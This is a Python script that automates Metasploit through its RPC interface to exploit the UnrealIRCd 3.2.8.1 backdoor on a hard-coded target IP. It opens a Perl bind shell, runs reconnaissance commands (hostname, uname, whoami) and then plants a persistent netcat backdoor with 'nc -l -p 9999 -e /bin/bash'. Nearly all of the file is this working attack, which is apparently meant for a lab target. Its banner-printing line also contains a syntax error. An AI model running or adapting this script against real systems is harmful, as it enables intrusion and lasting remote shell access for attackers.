#!/usr/bin/python

from pymetasploit3.msfrpc import *
from pymetasploit3.msfconsole import *
import sys
###
MSG_CONN = '[*] - Keep Walking - Conexao via MSFRPCD - like magic'
MSG_CONS = '[*] - Look - Exploiting right now - The Power of Metasploit'

def printline_number(number):
    print('='* + int(number))

printline_number(70)
printline_number(70)
print (str(MSG_CONN))

try:
    client = MsfRpcClient('123',ssl=False, port=55553)
    exploit = client.modules.use('exploit', 'exploit/unix/irc/unreal_ircd_3281_backdoor')
    exploit['RHOSTS'] = "11.11.11.171"
    exploit['RPORT'] = "6667"
    exploit.target = 0
    payload = client.modules.use('payload', 'cmd/unix/bind_perl')
    payload['LPORT'] = 5151
    exploit.execute(payload=payload)
    print('[+] - Explotation finish')
    print('[+] - Running commands on target')
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    shell.write('pwd')
    cmd = shell.read()
    print('[+] - Info:', cmd)

    shell.write('hostname')
    cmd = shell.read()
    print('[+] - Info:', cmd)

    shell.write('uname -a ')
    cmd = shell.read()
    print('[+] - Info:', cmd)

    shell.write('uptime')
    cmd = shell.read()
    print('[+] - Info:', cmd)

    shell.write('whoami')
    cmd = shell.read()
    print('[+] - Info:', cmd)

    shell.write('nc -l -p 9999 -e /bin/bash &')
    cmd = shell.read()
    print('[+] - Info:', cmd)

    shell.stop

except:
    print("[!] - Erro ao conectar ao Msfrpcd, verifique o servico")
    printline_number(70)
    sys.exit(1)
else:
    print("[*] - Conexao com Msfrpcd realizada com sucesso!")
    print(str(MSG_CONS))
finally:
    print()
    print("[*] - Good Hunter")
    printline_number(70)

